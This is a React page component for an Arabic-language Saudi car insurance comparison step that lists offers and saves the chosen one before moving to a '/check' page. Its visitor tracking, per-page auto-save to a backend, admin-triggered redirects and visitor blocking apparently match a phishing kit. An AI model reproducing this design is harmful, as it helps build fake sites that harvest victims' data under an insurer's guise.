

import { useEffect, useState } from "react"
import { useLocation } from 'wouter'
import { Button } from "@/components/ui/button"
import { Globe } from 'lucide-react'
import { FullPageLoader } from "@/components/loader"
import { StepIndicator } from "@/components/step-indicator"
import { getOrCreateVisitorID, updateVisitorPage, checkIfBlocked } from "@/lib/visitor-tracking"
import { useAutoSave } from "@/hooks/use-auto-save"
import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
import { addData } from "@/lib/api"
import { offerData } from "@/lib/offer-data"

export default function ComparisonPage() {
  const [, navigate] = useLocation()
  const [visitorID] = useState(() => getOrCreateVisitorID())
  const [loading, setLoading] = useState(true)
  const [isBlocked, setIsBlocked] = useState(false)
  
  // Form fields
  const [selectedOffer, setSelectedOffer] = useState<any>(null)
  const [selectedFeatures, setSelectedFeatures] = useState<Record<string, string[]>>({})
  const [offerTotalPrice, setOfferTotalPrice] = useState<number>(0)
  const [offersTab, setOffersTab] = useState<"comprehensive" | "against-others">("against-others")
  
  // Language
  const [language, setLanguage] = useState<"ar" | "en">("ar")
  
  // Auto-save selection
  useAutoSave({
    visitorId: visitorID,
    pageName: "compar",
    data: {
      selectedOfferName: selectedOffer?.company?.name || "",
      selectedFeatures,
      offerTotalPrice
    }
  })
  
  // Monitor redirect requests from admin
  useRedirectMonitor({
    visitorId: visitorID,
    currentPage: "compar"
  })
  
  // Initialize on mount
  useEffect(() => {
    const init = async () => {
      const blocked = await checkIfBlocked(visitorID)
      if (blocked) {
        setIsBlocked(true)
        setLoading(false)
        return
      }
      
      await updateVisitorPage(visitorID, "compar", 3)
      setLoading(false)
    }
    
    init()
  }, [visitorID])
  
  const toggleFeature = (offerId: string, featureId: string) => {
    setSelectedFeatures((prev) => {
      const current = prev[offerId] || []
      if (current.includes(featureId)) {
        return { ...prev, [offerId]: current.filter((id) => id !== featureId) }
      } else {
        return { ...prev, [offerId]: [...current, featureId] }
      }
    })
  }
  
  const calculateOfferTotal = (offer: (typeof offerData)[0], selectedFeatures: string[] = []) => {
    const mainPrice = Number.parseFloat(offer.main_price)
    const featuresPrice = offer.extra_features
      .filter((f) => selectedFeatures.includes(f.id))
      .reduce((sum, f) => sum + f.price, 0)
    const expensesTotal = offer.extra_expenses.reduce((sum, e) => sum + e.price, 0)
    return mainPrice + featuresPrice + expensesTotal
  }
  
  const filteredOffers = offerData.filter((offer) => offer.type === offersTab)
  
  const handleSelectOffer = async (offer: (typeof offerData)[0]) => {
    setSelectedOffer(offer)
    
    // Calculate total price including selected features
    const selectedOfferFeatures = selectedFeatures[offer.id] || []
    const totalPrice = calculateOfferTotal(offer, selectedOfferFeatures)
    
    const finalPrice = Number.parseFloat(totalPrice.toFixed(2))
    setOfferTotalPrice(finalPrice)
    
    const offerToSave = {
      name: offer.company.name,
      image_url: offer.company.image_url,
      type: offer.type,
      extra_features: offer.extra_features.filter(f => selectedOfferFeatures.includes(f.id))
    }
    
    // Save to localStorage immediately as fallback for CheckPage
    localStorage.setItem('selectedOffer', JSON.stringify(offerToSave))
    localStorage.setItem('offerTotalPrice', finalPrice.toString())
    
    try {
      // Send selectedOffer as full object so MySQL JSON column accepts it
      await addData({ 
        id: visitorID, 
        selectedOffer: offerToSave,
        offerTotalPrice: finalPrice,
        currentStep: 4,
        currentPage: "check",
        comparCompletedAt: new Date().toISOString()
      })
    } catch (err) {
      console.error('Failed to save offer to API, using localStorage fallback', err)
    }
    // Navigate regardless of API success - localStorage has the data
    navigate('/check')
  }
  
  if (loading) {
    return <FullPageLoader />
  }
  
  if (isBlocked) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <div className="text-center p-8 bg-white rounded-lg shadow-lg max-w-md">
          <h1 className="text-2xl font-bold text-red-600 mb-4">تم حظر الوصول</h1>
          <p className="text-gray-600">عذراً، تم حظر وصولك إلى هذه الخدمة.</p>
        </div>
      </div>
    )
  }
  
  return (
    <div className="min-h-screen bg-[#0a4a68]">
      {/* Header */}
      <div className="bg-[#0a4a68] px-3 py-3 md:px-6 md:py-4 flex items-center justify-between border-b border-white/10">
        <button 
          onClick={() => setLanguage(language === "ar" ? "en" : "ar")}
          className="flex items-center gap-1.5 px-3 py-2 md:px-4 md:py-2.5 bg-white/95 rounded-lg hover:bg-white transition-colors shadow-md"
        >
          <Globe className="w-4 h-4 md:w-5 md:h-5 text-[#0a4a68]" />
          <span className="text-[#0a4a68] font-semibold text-sm md:text-base">{language === "ar" ? "EN" : "AR"}</span>
        </button>
        <div className="w-10 h-10 md:w-12 md:h-12 rounded-full bg-white/10 border-2 border-white flex items-center justify-center shadow-md">
          <span className="text-white text-xl md:text-2xl font-bold">B</span>
        </div>
      </div>

      {/* Step Indicator */}
      <div className="bg-[#0a4a68] px-3 py-6 md:px-6 md:py-10 text-center border-b border-white/10">
        <StepIndicator currentStep={3} />
      </div>

      {/* Main Content */}
      <div className="max-w-4xl mx-auto -mt-4 md:-mt-6 px-3 md:px-4 pb-6 md:pb-8">
        {/* Bank Notice */}
        <div className="mb-4 md:mb-6">
          <div
            className="bg-blue-50 border-2 border-blue-200 rounded-lg md:rounded-xl p-3 md:p-4 shadow-sm"
            dir="rtl"
          >
            <p className="text-blue-900 text-xs md:text-sm leading-relaxed">
              بموجب تعليمات البنك المركزي السعودي، يحق لحامل الوثيقة إلغاء الوثيقة واسترداد كامل المبلغ المدفوع خلال
              15 يوماً من تاريخ الشراء، بشرط عدم حدوث أي مطالبات خلال هذه الفترة.
            </p>
          </div>
        </div>

        {/* Tabs */}
        <div className="mb-4 md:mb-6">
          <div className="bg-white rounded-lg md:rounded-xl shadow-md overflow-hidden">
            <div className="grid grid-cols-2 text-center" dir="rtl">
              <button
                onClick={() => setOffersTab("comprehensive")}
                className={`py-3 md:py-4 font-bold text-sm md:text-base lg:text-lg transition-all ${
                  offersTab === "comprehensive"
                    ? "bg-[#0a4a68] text-white"
                    : "bg-gray-100 text-gray-600 hover:bg-gray-200"
                }`}
              >
                تأمين شامل
              </button>
              <button
                onClick={() => setOffersTab("against-others")}
                className={`py-3 md:py-4 font-bold text-sm md:text-base lg:text-lg transition-all ${
                  offersTab === "against-others"
                    ? "bg-[#0a4a68] text-white"
                    : "bg-gray-100 text-gray-600 hover:bg-gray-200"
                }`}
              >
                تأمين ضد الغير
              </button>
            </div>
          </div>
        </div>

        {/* Offers List */}
        <div className="space-y-3 md:space-y-4">
          {filteredOffers.map((offer) => {
            const offerSelectedFeatures = selectedFeatures[offer.id] || []
            const totalPrice = calculateOfferTotal(offer, offerSelectedFeatures)

            return (
              <div
                key={offer.id}
                className="bg-white rounded-lg md:rounded-xl shadow-md hover:shadow-lg transition-shadow p-4 md:p-5 lg:p-6"
                dir="rtl"
              >
                <div className="flex items-start justify-between gap-3 md:gap-4 mb-3 md:mb-4">
                  <div className="flex-1">
                    <h3 className="text-lg md:text-xl font-bold text-gray-900 mb-1 md:mb-2">{offer.company.name}</h3>
                    <p className="text-blue-600 font-semibold text-base md:text-lg mb-3 md:mb-4">
                      التأمين {offer.type === "against-others" ? "ضد الغير" : "شامل"}
                    </p>

                    <div className="space-y-2 mb-3 md:mb-4">
                      {offer.extra_features.map((feature) => (
                        <div key={feature.id} className="flex items-start gap-2">
                          <input
                            type="checkbox"
                            id={`${offer.id}-${feature.id}`}
                            checked={offerSelectedFeatures.includes(feature.id)}
                            onChange={() => toggleFeature(offer.id, feature.id)}
                            className="mt-1 w-4 h-4 rounded border-gray-300"
                          />
                          <label
                            htmlFor={`${offer.id}-${feature.id}`}
                            className="flex-1 text-gray-700 text-xs md:text-sm cursor-pointer"
                          >
                            {feature.content}
                            {feature.price > 0 && (
                              <span className="text-blue-600 font-semibold mr-1">(+{feature.price} ﷼)</span>
                            )}
                          </label>
                        </div>
                      ))}
                    </div>

                    {offer.extra_expenses.length > 0 && (
                      <div className="border-t pt-2 mt-2">
                        <p className="text-xs text-gray-600 font-semibold mb-1">رسوم إضافية:</p>
                        {offer.extra_expenses.map((expense) => (
                          <div key={expense.id} className="flex justify-between text-xs text-gray-600">
                            <span>{expense.reason}</span>
                            <span>{expense.price} ﷼</span>
                          </div>
                        ))}
                      </div>
                    )}
                  </div>

                  <div className="flex flex-col items-end gap-2 md:gap-3">
                    <div className="w-16 h-16 md:w-20 md:h-20 rounded-lg border-2 border-gray-200 flex items-center justify-center bg-gray-50 overflow-hidden">
                      <img
                        src={offer.company.image_url || "/placeholder.svg"}
                        alt={offer.company.name}
                        className="w-full h-full object-contain"
                      />
                    </div>
                    <div className="text-left">
                      <div className="text-2xl md:text-3xl font-bold text-[#0a4a68]">{totalPrice.toFixed(2)}</div>
                      <div className="text-xs md:text-sm text-gray-600">﷼ / سنة</div>
                    </div>
                  </div>
                </div>

                <Button
                  onClick={() => handleSelectOffer(offer)}
                  className="w-full h-10 md:h-11 bg-[#0a4a68] hover:bg-[#083d57] text-white font-semibold text-sm md:text-base rounded-lg md:rounded-xl shadow-md hover:shadow-lg transition-all"
                >
                  اختر هذا العرض
                </Button>
              </div>
            )
          })}
        </div>
      </div>
    </div>
  )
}
